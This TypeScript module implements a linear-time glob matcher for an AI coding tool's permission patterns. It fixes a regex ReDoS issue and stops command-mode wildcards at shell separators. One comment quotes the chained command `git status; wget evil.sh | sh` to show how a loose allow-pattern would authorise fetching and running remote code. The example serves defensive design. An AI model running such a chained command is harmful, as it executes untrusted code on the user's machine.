/**
 * Minimal glob matcher for trust patterns.
 * Supports: *, **, ?, character classes [abc], [a-z], negation [!...] or [^...].
 *
 * Compiled patterns are cached so repeated calls with the same pattern
 * avoid recompilation overhead.
 *
 * ## Why this is not a plain regex any more (WS-SEC-ReDoS)
 *
 * The obvious compilation — `*` → `[^/]*`, `**` → `.*`, concatenated and
 * anchored — is catastrophically backtracking. Two or more wildcards separated
 * by literals give the engine an exponential number of ways to split the
 * subject, and on a NON-matching subject it tries all of them before failing.
 * Measured on this repo's Node (v8):
 *
 *   subject 256 chars: `'*a'.repeat(3)` 13 ms · `.repeat(4)` 794 ms ·
 *                      `.repeat(5)` **56 seconds** (a 10-character pattern)
 *   subject  61 chars: `'**a'.repeat(8)` **24 seconds**
 *
 * V8's regex engine is uninterruptible, so no `AbortSignal`, timeout or worker
 * deadline recovers this — the whole process is wedged. It is reachable from
 * model-supplied `glob`/`grep`/`replace`/`tree` tool arguments and from a
 * repo-committed `.gitignore` line (untrusted in this project's threat model).
 *
 * Bounding the input does not fix it: `src/**\/test/**\/*.spec.ts` is a
 * legitimate four-wildcard pattern and four wildcards already cost ~800 ms, and
 * eight wildcards blow up against a subject of only 61 characters, far below
 * {@link MAX_GLOB_PATTERN_LEN}. The exponent has to go, not the input size.
 *
 * So matching runs on a Thompson-style NFA simulation instead
 * ({@link compileGlobMatcher}): one state set advanced once per input
 * character, which is O(pattern × input) with no backtracking at all. The
 * pattern is still compiled to the byte-identical regex `source` as before,
 * and {@link compileGlob} still returns a real `RegExp` — but one whose `exec`
 * (and therefore `test`) is served by the NFA, so every existing call site is
 * fixed without changing its code. See {@link GlobRegExp}.
 */

function escapeRegex(s: string): string {
  return s.replace(/[.+^${}()|\\]/g, '\\$&');
}

// Module-level cache to avoid recompiling the same pattern on every call.
// LRU-ish eviction keeps unbounded growth in check for long-running processes.
const COMPILED_GLOB_CACHE = new Map<string, RegExp>();
const CACHE_MAX_SIZE = 2000;

// Matches nothing — `[^\s\S]` can never be satisfied. Used as the cached
// result for patterns that fail to compile (e.g. an over-long auto-trusted
// command) so one bad trust entry degrades to "no match" instead of throwing.
//
// NOTE (fail-open hazard): "no match" is fail-OPEN for a DENY rule. This
// degradation is pre-existing and deliberately NOT extended — the ReDoS fix
// below adds no new rejection path, because a linear matcher has no reason to
// refuse a pattern it used to accept. The only inputs that still reach
// NEVER_MATCH are the two the old code already rejected: a pattern longer than
// MAX_GLOB_PATTERN_LEN, and a character class that is not valid regex class
// syntax (e.g. `[z-a]`).
const NEVER_MATCH = /[^\s\S]/;

/**
 * Characters a single `*` must NOT cross when the matched subject is a shell
 * command line (WS-047).
 *
 * In a path glob, `*` meaning "anything but `/`" is correct. Applied to a
 * command it is far too generous: `git *` compiles to `git [^/]*`, which
 * matches `git status; wget evil.sh | sh`. The user wrote a pattern naming one
 * program and authorized an arbitrary chain.
 *
 * These are the characters that let a new command start, or that reach outside
 * the one being named: command separators (`;` `&` `|`, newline), substitution
 * (`` ` `` `$`), and redirection (`<` `>`). `(`/`)` are deliberately absent —
 * a subshell cannot begin without one of the separators above, so excluding
 * them buys nothing and costs false rejections.
 *
 * This is a *regex character-class body*: `\\n`/`\\r` are the two-character
 * escapes the regex engine reads as newline/CR, not literal backslash-n. The
 * single-character probes below are derived from it rather than restated, so
 * the two spellings cannot drift apart.
 */
const COMMAND_WILDCARD_STOP = ';&|\\n\\r`$<>';

/** True for a character a `*`/`?` may not cross in command-subject mode. */
const CMD_STAR_STOP = new RegExp(`[/${COMMAND_WILDCARD_STOP}]`);
/** True for a character a `**` may not cross in command-subject mode. */
const CMD_GLOBSTAR_STOP = new RegExp(`[${COMMAND_WILDCARD_STOP}]`);

/**
 * Characters a path-mode `**` may not cross.
 *
 * `**` compiles to `.*`, and JavaScript's `.` — without the `s` flag, which
 * this module never sets — does not match a LineTerminator. So `**` has always
 * stopped at `\n`, `\r`, U+2028 and U+2029, and `^…$` without the `m` flag
 * means a subject containing one can never match `**` at all. That is a real,
 * observable behaviour (the differential corpus catches its absence), and it is
 * the NARROWER reading, so it is preserved rather than "fixed": widening `**`
 * to swallow newlines would silently broaden every allow-pattern in the
 * codebase against subjects that embed one.
 */
const LINE_TERMINATOR = /[\n\r\u2028\u2029]/;

function getCachedGlob(pattern: string, commandSubject = false): RegExp {
  // The mode changes the compiled regex, so it must be part of the cache key —
  // otherwise the first caller's mode is served to every later one.
  const cacheKey = commandSubject ? `cmd\u0000${pattern}` : pattern;
  const cached = COMPILED_GLOB_CACHE.get(cacheKey);
  if (cached) return cached;
  if (COMPILED_GLOB_CACHE.size >= CACHE_MAX_SIZE) {
    // Evict oldest 25% when at capacity without array allocation
    let evicted = 0;
    const target = Math.floor(CACHE_MAX_SIZE / 4);
    for (const key of COMPILED_GLOB_CACHE.keys()) {
      COMPILED_GLOB_CACHE.delete(key);
      if (++evicted >= target) break;
    }
  }
  let re: RegExp;
  try {
    re = compileGlob(pattern, commandSubject);
  } catch {
    // A pathological trust pattern (over MAX_GLOB_PATTERN_LEN — e.g. a long
    // one-liner auto-trusted in YOLO/Auto mode) must NOT throw out of every
    // subsequent permission check and break unrelated commands like `true`
    // or `ls` (#20). Cache a never-matching regex so the bad entry is inert.
    re = NEVER_MATCH;
  }
  COMPILED_GLOB_CACHE.set(cacheKey, re);
  return re;
}

// Cap glob pattern length to prevent excessively long compiled regexes.
const MAX_GLOB_PATTERN_LEN = 1024;

/**
 * One glob atom. Every atom consumes exactly one input character except the
 * two star kinds, which consume zero or more.
 */
type GlobToken =
  | { kind: 'literal'; ch: string }
  /** `?` — one character, not `/` (and not a shell separator in command mode). */
  | { kind: 'one' }
  /** `*` — zero or more characters, not `/` (nor separators in command mode). */
  | { kind: 'star' }
  /** `**` — zero or more of anything (minus separators in command mode). */
  | { kind: 'globstar' }
  /** `[...]` — one character, tested against the compiled class. */
  | { kind: 'class'; re: RegExp };

/**
 * Parse a glob into both the regex source the old implementation produced and
 * the token list the linear matcher runs on.
 *
 * The two are built in a SINGLE pass off the same branches on purpose: the
 * regex source is what {@link compileGlob} still exposes as `.source`, and any
 * drift between it and the tokens would be a silent semantic split. Character
 * classes are handed to the regex engine verbatim (one class, one character —
 * no backtracking is possible) rather than re-implemented, which keeps range,
 * escape and unicode behaviour bit-for-bit identical and preserves the old
 * "invalid class throws" contract.
 */
function parseGlob(
  pattern: string,
  commandSubject: boolean,
): { source: string; tokens: GlobToken[] } {
  if (pattern.length > MAX_GLOB_PATTERN_LEN) {
    throw new Error(`Glob pattern exceeds ${MAX_GLOB_PATTERN_LEN} characters`);
  }
  const star = commandSubject ? `[^/${COMMAND_WILDCARD_STOP}]*` : '[^/]*';
  const question = commandSubject ? `[^/${COMMAND_WILDCARD_STOP}]` : '[^/]';
  const tokens: GlobToken[] = [];
  let i = 0;
  let re = '^';
  while (i < pattern.length) {
    const c = pattern[i];
    if (c === '*') {
      if (pattern[i + 1] === '*') {
        // ** matches any number of chars including /
        // For a command subject it still must not cross a separator: `**` is a
        // path idiom ("any depth"), and letting it mean "anything at all" here
        // would reintroduce the exact hole this mode closes via a two-character
        // pattern instead of a one-character one.
        re += commandSubject ? `[^${COMMAND_WILDCARD_STOP}]*` : '.*';
        tokens.push({ kind: 'globstar' });
        i += 2;
        // Skip trailing slash so '**/x' matches 'x'
        if (pattern[i] === '/') i++;
      } else {
        // single * matches any chars except / (and, for commands, separators)
        re += star;
        tokens.push({ kind: 'star' });
        i++;
      }
    } else if (c === '?') {
      re += question;
      tokens.push({ kind: 'one' });
      i++;
    } else if (c === '[') {
      const closeIndex = pattern.indexOf(']', i + 1);
      if (closeIndex === -1) {
        re += '\\[';
        tokens.push({ kind: 'literal', ch: '[' });
        i++;
        continue;
      }
      let cls = '[';
      i++;
      if (pattern[i] === '!' || pattern[i] === '^') {
        cls += '^';
        i++;
      }
      // A `]` as the FIRST member of the class body is a literal `]` member
      // (the standard glob spelling: `[]]` ≡ class { ']' }), not the
      // terminator. The old loop closed the class on the first `]`, so
      // `[]]` compiled to an empty class `[]` that could never match — the
      // `ch === ']'` escape branch below was dead code. `firstMember` is
      // cleared after the first iteration, so any later `]` still closes.
      let firstMember = true;
      while (i < pattern.length && (pattern[i] !== ']' || firstMember)) {
        const ch = pattern[i] ?? '';
        // Inside a regex class, only `]`, `\`, and `^`/`-` at boundaries need
        // escaping. We've already consumed the leading `^`; the rest are
        // literal. Escape `\` defensively and pass the rest through verbatim
        // so ranges like `a-z` continue to work.
        if (ch === '\\') {
          cls += '\\\\';
        } else if (ch === ']' || ch === '^') {
          cls += `\\${ch}`;
        } else {
          cls += ch;
        }
        firstMember = false;
        i++;
      }
      cls += ']';
      re += cls;
      // Compiling the class alone both validates it (an invalid class such as
      // `[z-a]` threw from the old whole-pattern compile, and still throws
      // here) and gives the matcher an exact single-character oracle.
      tokens.push({ kind: 'class', re: new RegExp(cls) });
      i++; // skip closing ]
    } else {
      re += escapeRegex(c ?? '');
      tokens.push({ kind: 'literal', ch: c ?? '' });
      i++;
    }
  }
  re += '$';
  return { source: re, tokens };
}

/**
 * A position predicate over an input string: `index` runs from `0` to
 * `input.length` inclusive and denotes the boundary *before* `input[index]`.
 */
export type GlobBoundary = (index: number, input: string) => boolean;

const START_OF_INPUT: GlobBoundary = (index) => index === 0;
const END_OF_INPUT: GlobBoundary = (index, input) => index === input.length;

/**
 * A compiled glob that can be matched in time linear in
 * `pattern.length × input.length`, with no backtracking.
 */
export interface CompiledGlobMatcher {
  /** The equivalent anchored regex source (what {@link compileGlob} exposes). */
  readonly source: string;
  /** Whole-string match, exactly equivalent to the old `compileGlob(p).test(s)`. */
  test(input: string): boolean;
  /**
   * Does SOME substring of `input` that starts at a boundary accepted by
   * `isStart` and ends at a boundary accepted by `isEnd` match the glob?
   *
   * This is the composition primitive that replaces splicing the regex
   * `source` into a bigger regex (which is how the gitignore matcher used to
   * anchor rules, and how it inherited this ReDoS). Because every candidate
   * start is seeded into the same single left-to-right pass, considering ALL
   * starts and ALL ends costs the same O(pattern × input) as one plain match —
   * it does not multiply by the number of candidate boundaries.
   */
  testSpan(input: string, isStart: GlobBoundary, isEnd: GlobBoundary): boolean;
}

/**
 * Compile a glob to a linear-time matcher.
 *
 * Throws on the same inputs the old `compileGlob` threw on (over-long pattern,
 * invalid character class) — no new rejection paths, see {@link NEVER_MATCH}.
 */
export function compileGlobMatcher(pattern: string, commandSubject = false): CompiledGlobMatcher {
  const { source, tokens } = parseGlob(pattern, commandSubject);
  const tokenCount = tokens.length;
  // State `j` means "about to consume token j"; state `tokenCount` is accept.
  const stateCount = tokenCount + 1;

  // Scratch buffers, allocated once per compiled pattern and reused. Matching
  // is fully synchronous, so reuse across calls cannot interleave.
  let cur = new Uint8Array(stateCount);
  let next = new Uint8Array(stateCount);

  const oneOk = commandSubject
    ? (c: string): boolean => !CMD_STAR_STOP.test(c)
    : (c: string): boolean => c !== '/';
  const globstarOk = commandSubject
    ? (c: string): boolean => !CMD_GLOBSTAR_STOP.test(c)
    : // Path mode compiles `**` to `.*`, which never crosses a LineTerminator.
      (c: string): boolean => !LINE_TERMINATOR.test(c);

  /**
   * Epsilon closure: the only epsilon edges are "a star matched zero
   * characters", which always step forward by exactly one state, so a single
   * ascending pass reaches the fixed point.
   */
  const close = (set: Uint8Array): void => {
    for (let j = 0; j < tokenCount; j++) {
      if (!set[j]) continue;
      const kind = tokens[j]?.kind;
      if (kind === 'star' || kind === 'globstar') set[j + 1] = 1;
    }
  };

  const run = (input: string, isStart: GlobBoundary, isEnd: GlobBoundary): boolean => {
    const n = input.length;
    cur.fill(0);
    if (isStart(0, input)) cur[0] = 1;
    close(cur);
    if (cur[tokenCount] && isEnd(0, input)) return true;

    for (let i = 0; i < n; i++) {
      const c = input[i] as string;
      next.fill(0);
      let live = 0;
      for (let j = 0; j < tokenCount; j++) {
        if (!cur[j]) continue;
        const t = tokens[j] as GlobToken;
        switch (t.kind) {
          case 'literal':
            if (c === t.ch) {
              next[j + 1] = 1;
              live++;
            }
            break;
          case 'one':
            if (oneOk(c)) {
              next[j + 1] = 1;
              live++;
            }
            break;
          case 'class':
            if (t.re.test(c)) {
              next[j + 1] = 1;
              live++;
            }
            break;
          case 'star':
            // Stays on the same state: the star absorbs this character.
            if (oneOk(c)) {
              next[j] = 1;
              live++;
            }
            break;
          case 'globstar':
            if (globstarOk(c)) {
              next[j] = 1;
              live++;
            }
            break;
        }
      }
      const seedHere = isStart(i + 1, input);
      if (seedHere) {
        next[0] = 1;
        live++;
      }
      const swap = cur;
      cur = next;
      next = swap;
      if (live === 0) {
        // No live thread and — for the whole-string case — no later start that
        // could revive one. testSpan may still seed further along, so only the
        // anchored case can bail early.
        if (isStart === START_OF_INPUT) return false;
        continue;
      }
      close(cur);
      if (cur[tokenCount] && isEnd(i + 1, input)) return true;
    }
    return false;
  };

  return {
    source,
    test: (input: string): boolean => run(input, START_OF_INPUT, END_OF_INPUT),
    testSpan: (input: string, isStart: GlobBoundary, isEnd: GlobBoundary): boolean =>
      run(input, isStart, isEnd),
  };
}

/**
 * A `RegExp` whose matching is done by the linear glob NFA rather than by the
 * backtracking regex engine.
 *
 * Why a `RegExp` subclass and not a plain `(s: string) => boolean`: this value
 * is returned by the public {@link compileGlob}, whose callers consume it as a
 * real regex — `packages/tools/src/{glob,grep,replace,tree}.ts` call `.test()`
 * and reset `.lastIndex`, and the gitignore matcher reads `.source`. Keeping
 * the declared type means every one of those call sites is fixed without being
 * edited, and `instanceof RegExp`, `.source`, `.flags` and `.lastIndex` all
 * keep working.
 *
 * Only `exec` is overridden: per spec, `RegExp.prototype.test` and the
 * `String.prototype.match`/`replace` paths all funnel through `RegExpExec`,
 * which calls the instance's own `exec`. Overriding the one entry point
 * therefore routes every consumer through the NFA. `Symbol.species` is pinned
 * to plain `RegExp` so the spec's internal re-construction paths (e.g.
 * `Symbol.split`, which rebuilds with a `y` flag) never try to rebuild this
 * subclass through a constructor signature it does not have.
 *
 * The pattern is anchored `^…$`, so a successful match is always the whole
 * subject at index 0 and there are no capture groups — the result array is
 * exactly what the old regex returned.
 */
class GlobRegExp extends RegExp {
  static override get [Symbol.species](): RegExpConstructor {
    return RegExp;
  }

  private readonly matcher: CompiledGlobMatcher;

  constructor(matcher: CompiledGlobMatcher) {
    super(matcher.source);
    this.matcher = matcher;
  }

  override exec(input: string): RegExpExecArray | null {
    const str = String(input);
    if (!this.matcher.test(str)) return null;
    const result = [str] as unknown as RegExpExecArray;
    result.index = 0;
    result.input = str;
    // `groups` is left absent rather than set to `undefined`: the compiled
    // pattern has no named groups, and that is exactly what the old regex's
    // result array looked like.
    return result;
  }
}

/**
 * @param commandSubject - When true, compile for matching a shell command line
 *   rather than a path: a single `*` additionally stops at the shell
 *   separators in {@link COMMAND_WILDCARD_STOP}, and `**` is NOT a
 *   match-everything escape hatch (see below). Defaults to false, so every
 *   existing caller — file search, grep, replace, gitignore, the indexer —
 *   keeps its current semantics exactly.
 *
 * The returned value is a real `RegExp` with the same `source` as before, but
 * its matching runs on the linear NFA — see {@link GlobRegExp}. New code that
 * does not need a `RegExp` should prefer {@link compileGlobMatcher}.
 */
export function compileGlob(pattern: string, commandSubject = false): RegExp {
  return new GlobRegExp(compileGlobMatcher(pattern, commandSubject));
}

export function matchGlob(pattern: string, input: string): boolean {
  if (typeof pattern !== 'string' || typeof input !== 'string') return false;
  return getCachedGlob(pattern).test(input);
}

export function matchAny(patterns: string[], input: string): boolean {
  if (!Array.isArray(patterns) || typeof input !== 'string') return false;
  return patterns.some((p) => matchGlob(p, input));
}

/**
 * Match a shell command line against a trust pattern, with `*` and `**`
 * stopping at shell separators (WS-047).
 *
 * A separate entry point rather than a flag on {@link matchGlob} because the
 * two must never be confused at a call site: this is strictly NARROWER, so it
 * is correct for deciding what a pattern ALLOWS and wrong for deciding what a
 * pattern DENIES — narrowing a deny pattern un-blocks things. The caller has to
 * pick deliberately.
 */
export function matchCommandGlob(pattern: string, input: string): boolean {
  if (typeof pattern !== 'string' || typeof input !== 'string') return false;
  return getCachedGlob(pattern, true).test(input);
}

export function matchAnyCommand(patterns: string[], input: string): boolean {
  if (!Array.isArray(patterns) || typeof input !== 'string') return false;
  return patterns.some((p) => matchCommandGlob(p, input));
}
